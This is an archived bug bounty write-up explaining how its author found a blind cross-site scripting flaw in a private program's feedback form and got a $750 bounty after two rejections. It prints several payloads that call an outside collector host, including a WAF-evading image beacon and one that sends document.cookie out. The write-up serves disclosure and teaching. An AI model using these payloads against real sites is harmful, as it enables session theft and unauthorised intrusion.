---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-18_na-to-750-bounty-for-a-blind-xss.md
original_filename: 2022-08-18_na-to-750-bounty-for-a-blind-xss.md
title: N/a to $750 bounty for a Blind XSS.
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: 23e3dfc674fa7573e1b537b2b5bac34e5d0749c37193ce97f84333c1ba20d1fa
text_sha256: a5a8cebccb432a24c59a474ccbe8ce84e64a7da3db354db6d2765d59ab289baf
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# N/a to $750 bounty for a Blind XSS.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-18_na-to-750-bounty-for-a-blind-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `23e3dfc674fa7573e1b537b2b5bac34e5d0749c37193ce97f84333c1ba20d1fa`
- Text SHA256: `a5a8cebccb432a24c59a474ccbe8ce84e64a7da3db354db6d2765d59ab289baf`


## Content

---
title: "N/a to $750 bounty for a Blind XSS."
url: "https://medium.com/@dirtycoder0124/n-a-to-750-bounty-for-a-blind-xss-dc218c84a340"
authors: ["Dirtycoder (@dirtycoder0124)"]
bugs: ["Blind XSS"]
bounty: "750"
publication_date: "2022-08-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2294
scraped_via: "browseros"
---

# N/a to $750 bounty for a Blind XSS.

N/a to $750 bounty for a Blind XSS.
Dirtycoder
Follow
3 min read
·
Aug 18, 2022

189

4

Without wasting any time, I try to keep everything to the point.

It’s a private program, so we call it www.target.com.

Vulnerable form: Feedback form on www.target.com

I use www.blindf.com to find the blind XSS. You can use your own VPS to receive the response.

My methodology to find the BXSS:

My experience says that the basic BXSS payload

“></script><script src=https://blindf.com/bx.php></script>

does not work many times. Also, any other payload that extracts dom or page source code doesn’t work many times. So to find the BXSS, I use blind HTML payloads

“><img src=’https://blindf.com/b.php?c=querytoremember'/>

in every text field. The reason behind using it is to fool the WAF or any other security implemented by the developer. Because this payload does not use any Javascript code or tags, it executes without any difficulty and sends a response to www.blindf.com upon execution. Once you receive the response, you can go ahead and test for BXSS.

Get Dirtycoder’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

How I found this bug:

I used BHTML payload

“><img src=’https://blindf.com/b.php?c=querytoremember’>

in every text field of the feedback form on www.target.com/feedback.

After some days, www.blindf.com received a response from the vulnerable server.
I went ahead and put the basic BXSS payload

“></script><script src=https://blindf.com/bx.php></script>

to find the BXSS. Because at this point, I knew that the form was vulnerable.

I waited for 20 days but did not receive a response.
Then I used a trick. I put blind HTML payload

“><img src=’https://blindf.com/b.php?c=target_com_latestpayload'>

and submitted the form. I resubmitted the form with my basic BXSS payload too. It means I submitted the form twice, the first time with BHTML payload and the second time with a BXSS payload.

After some time, I received a response from my BHTML payload, but the BXSS payload did not send any response. I understand that my BXSS payload has failed and it will not send any response now. Because both payloads were submitted on the same day, they should be fired at the same time.
www.blindf.com provides other payloads too, with a minimum JS execution. I used a different payload that only extracts cookies and not any DOM values from the page.

Payload:-

“><img src=https://blindf.com/a.jpg onload=this.src=’https://blindf.com/oc.php/?c='+document.cookie>

This payload was executed and I received the basic cookie.
Bug Submitted
Triager tried to reproduce the bug but failed. So he closed my bug as N/a.
Press enter or click to view image in full size
I raised the issue. Another triager used a famous website that is used to find the BXSS but did not receive any response.
Again closed as N/a
Press enter or click to view image in full size
I raised the issue again and provided my www.blindf.com account credentials to him to reproduce the bug.
I asked him to fill out the form twice, the first time with the BHTML payload and the second time with the BXSS (Cookie extraction) payload.
Payloads were executed and www.blindf.com received the response from both payloads.
Triaged
Bounty received $750

So, after closing my bugs as N/a two times. I finally received the bounty.

To get daily bug bounty updates and tips and tricks join our telegram group

https://t.me/+xa7Q6GcEudFkYzA1

Thank you for reading my boring stuff and tolerating my bad English
